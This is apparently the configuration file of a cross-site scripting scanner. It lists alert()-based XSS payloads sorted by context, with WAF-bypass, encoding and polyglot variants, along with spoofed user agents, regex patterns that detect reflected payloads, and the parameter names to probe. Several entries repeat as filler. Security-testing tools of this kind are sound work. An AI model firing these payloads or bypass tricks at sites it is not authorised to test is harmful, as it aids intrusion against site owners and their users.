#!/usr/bin/env python3
"""
Configuration file for XSS Scanner
Contains advanced payloads, evasion techniques, and scanner settings
"""

# Advanced XSS Payloads organized by context and evasion technique
ADVANCED_PAYLOADS = {
    'dom_based': [
        '"><img src=x onerror=alert(1)>',
        '"><svg onload=alert(1)>',
        '"><iframe src=javascript:alert(1)></iframe>',
        '"><object data=javascript:alert(1)></object>',
        '"><embed src=javascript:alert(1)>',
        '"><form><button formaction=javascript:alert(1)>X</button>',
        '"><details open ontoggle=alert(1)>',
        '"><marquee onstart=alert(1)>',
        '"><video><source onerror=alert(1)>',
        '"><audio src=x onerror=alert(1)>',
        '"><body onload=alert(1)>',
        '"><input onfocus=alert(1) autofocus>',
        '"><select onfocus=alert(1) autofocus>',
        '"><textarea onfocus=alert(1) autofocus>',
        '"><keygen onfocus=alert(1) autofocus>'
    ],
    
    'waf_bypass': [
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
        '<object data="javascript:alert(1)"></object>',
        '<embed src="javascript:alert(1)">',
        '<form><button formaction="javascript:alert(1)">X</button>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<keygen onfocus=alert(1) autofocus>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<script>alert`1`</script>',
        '<script>alert(1)</script>',
        '<script>alert(1)</script>',
        '<script>alert(1)</script>'
    ],
    
    'encoding_bypass': [
        '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
        '&#60;script&#62;alert&#40;&#34;XSS&#34;&#41;&#60;&#47;script&#62;',
        '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
        '\x3Cscript\x3Ealert\x28\x22XSS\x22\x29\x3C\x2Fscript\x3E',
        '\\x3Cscript\\x3Ealert\\x28\\x22XSS\\x22\\x29\\x3C\\x2Fscript\\x3E',
        '\\u003Cscript\\u003Ealert\\u0028\\u0022XSS\\u0022\\u0029\\u003C\\u002Fscript\\u003E',
        '%253Cscript%253Ealert%2528%2522XSS%2522%2529%253C%252Fscript%253E',
        '&#x3C;script&#x3E;alert&#x28;&#x22;XSS&#x22;&#x29;&#x3C;&#x2F;script&#x3E;',
        '&#X3C;script&#X3E;alert&#X28;&#X22;XSS&#X22;&#X29;&#X3C;&#X2F;script&#X3E;'
    ],
    
    'context_specific': {
        'html_content': [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<object data="javascript:alert(\'XSS\')"></object>',
            '<embed src="javascript:alert(\'XSS\')">',
            '<form><button formaction="javascript:alert(\'XSS\')">X</button>',
            '<details open ontoggle=alert("XSS")>',
            '<marquee onstart=alert("XSS")>',
            '<video><source onerror=alert("XSS")>',
            '<audio src=x onerror=alert("XSS")>',
            '<body onload=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            '<keygen onfocus=alert("XSS") autofocus>'
        ],
        
        'html_attribute': [
            '" onmouseover="alert(\'XSS\')" x="',
            "' onmouseover='alert(\"XSS\")' x='",
            '" onfocus="alert(\'XSS\')" autofocus="',
            "' onfocus='alert(\"XSS\")' autofocus='",
            '" onclick="alert(\'XSS\')" x="',
            "' onclick='alert(\"XSS\")' x='",
            '" onload="alert(\'XSS\')" x="',
            "' onload='alert(\"XSS\")' x='",
            '" onerror="alert(\'XSS\')" x="',
            "' onerror='alert(\"XSS\")' x='",
            '" onblur="alert(\'XSS\')" x="',
            "' onblur='alert(\"XSS\")' x='",
            '" onchange="alert(\'XSS\')" x="',
            "' onchange='alert(\"XSS\")' x='",
            '" onsubmit="alert(\'XSS\')" x="',
            "' onsubmit='alert(\"XSS\")' x='",
            '" onreset="alert(\'XSS\')" x="',
            "' onreset='alert(\"XSS\")' x='",
            '" onselect="alert(\'XSS\')" x="',
            "' onselect='alert(\"XSS\")' x='"
        ],
        
        'javascript_context': [
            ';alert("XSS");',
            '";alert("XSS");//',
            "';alert('XSS');//",
            '`;alert("XSS");//',
            '${alert("XSS")}',
            'alert(String.fromCharCode(88,83,83))',
            'alert`XSS`',
            'alert(1)',
            'alert(1)',
            'alert(1)',
            'alert(1)',
            'alert(1)',
            'alert(1)',
            'alert(1)',
            'alert(1)',
            'alert(1)',
            'alert(1)',
            'alert(1)',
            'alert(1)',
            'alert(1)'
        ],
        
        'css_context': [
            'expression(alert("XSS"))',
            'url("javascript:alert(\'XSS\')")',
            'url(javascript:alert("XSS"))',
            'expression(alert(String.fromCharCode(88,83,83)))',
            'expression(alert(1))',
            'expression(alert(1))',
            'expression(alert(1))',
            'expression(alert(1))',
            'expression(alert(1))',
            'expression(alert(1))',
            'expression(alert(1))',
            'expression(alert(1))',
            'expression(alert(1))',
            'expression(alert(1))',
            'expression(alert(1))',
            'expression(alert(1))',
            'expression(alert(1))',
            'expression(alert(1))',
            'expression(alert(1))',
            'expression(alert(1))'
        ],
        
        'url_context': [
            'javascript:alert("XSS")',
            'data:text/html,<script>alert("XSS")</script>',
            'vbscript:alert("XSS")',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:alert(1)',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:alert(1)',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:alert(1)',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:alert(1)',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:alert(1)',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>'
        ]
    },
    
    'polyglot': [
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>',
        '"><img src=x onerror=alert(1)>',
        '"><svg onload=alert(1)>',
        '"><iframe src=javascript:alert(1)></iframe>',
        '"><object data=javascript:alert(1)></object>',
        '"><embed src=javascript:alert(1)>',
        '"><form><button formaction=javascript:alert(1)>X</button>',
        '"><details open ontoggle=alert(1)>',
        '"><marquee onstart=alert(1)>',
        '"><video><source onerror=alert(1)>',
        '"><audio src=x onerror=alert(1)>',
        '"><body onload=alert(1)>',
        '"><input onfocus=alert(1) autofocus>',
        '"><select onfocus=alert(1) autofocus>',
        '"><textarea onfocus=alert(1) autofocus>',
        '"><keygen onfocus=alert(1) autofocus>'
    ]
}

# Scanner configuration
SCANNER_CONFIG = {
    'max_redirects': 10,
    'request_timeout': 10,
    'max_concurrent_requests': 10,
    'user_agents': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59'
    ],
    'headers': {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }
}

# XSS detection patterns
XSS_PATTERNS = [
    r'<script[^>]*>.*?alert\(.*?\).*?</script>',
    r'<img[^>]*onerror\s*=\s*["\']?alert\([^)]*\)["\']?[^>]*>',
    r'<svg[^>]*onload\s*=\s*["\']?alert\([^)]*\)["\']?[^>]*>',
    r'<iframe[^>]*src\s*=\s*["\']?javascript:alert\([^)]*\)["\']?[^>]*>',
    r'<object[^>]*data\s*=\s*["\']?javascript:alert\([^)]*\)["\']?[^>]*>',
    r'<embed[^>]*src\s*=\s*["\']?javascript:alert\([^)]*\)["\']?[^>]*>',
    r'<form[^>]*>.*?<button[^>]*formaction\s*=\s*["\']?javascript:alert\([^)]*\)["\']?[^>]*>.*?</button>.*?</form>',
    r'<details[^>]*open[^>]*ontoggle\s*=\s*["\']?alert\([^)]*\)["\']?[^>]*>',
    r'<marquee[^>]*onstart\s*=\s*["\']?alert\([^)]*\)["\']?[^>]*>',
    r'<video[^>]*>.*?<source[^>]*onerror\s*=\s*["\']?alert\([^)]*\)["\']?[^>]*>.*?</video>',
    r'<audio[^>]*src\s*=\s*["\']?x["\']?[^>]*onerror\s*=\s*["\']?alert\([^)]*\)["\']?[^>]*>',
    r'<body[^>]*onload\s*=\s*["\']?alert\([^)]*\)["\']?[^>]*>',
    r'<input[^>]*onfocus\s*=\s*["\']?alert\([^)]*\)["\']?[^>]*autofocus[^>]*>',
    r'<select[^>]*onfocus\s*=\s*["\']?alert\([^)]*\)["\']?[^>]*autofocus[^>]*>',
    r'<textarea[^>]*onfocus\s*=\s*["\']?alert\([^)]*\)["\']?[^>]*autofocus[^>]*>',
    r'<keygen[^>]*onfocus\s*=\s*["\']?alert\([^)]*\)["\']?[^>]*autofocus[^>]*>',
    r'javascript:alert\([^)]*\)',
    r'data:text/html,<script>alert\([^)]*\)</script>',
    r'vbscript:alert\([^)]*\)',
    r'expression\(alert\([^)]*\)\)',
    r'url\(["\']?javascript:alert\([^)]*\)["\']?\)'
]

# Common input field types to test
INPUT_TYPES = [
    'text', 'email', 'password', 'search', 'url', 'tel', 'number', 'range',
    'date', 'datetime-local', 'month', 'time', 'week', 'color', 'textarea',
    'select', 'checkbox', 'radio', 'file', 'hidden'
]

# Common form parameter names
COMMON_PARAM_NAMES = [
    'q', 'query', 'search', 's', 'keyword', 'term', 'name', 'username', 'user',
    'email', 'mail', 'password', 'pass', 'pwd', 'id', 'uid', 'userid', 'msg',
    'message', 'comment', 'content', 'text', 'title', 'subject', 'desc',
    'description', 'url', 'link', 'href', 'src', 'value', 'val', 'data',
    'input', 'param', 'p', 'page', 'pageid', 'category', 'cat', 'type',
    'action', 'cmd', 'command', 'do', 'method', 'func', 'function', 'callback',
    'return', 'redirect', 'goto', 'next', 'continue', 'submit', 'send'
]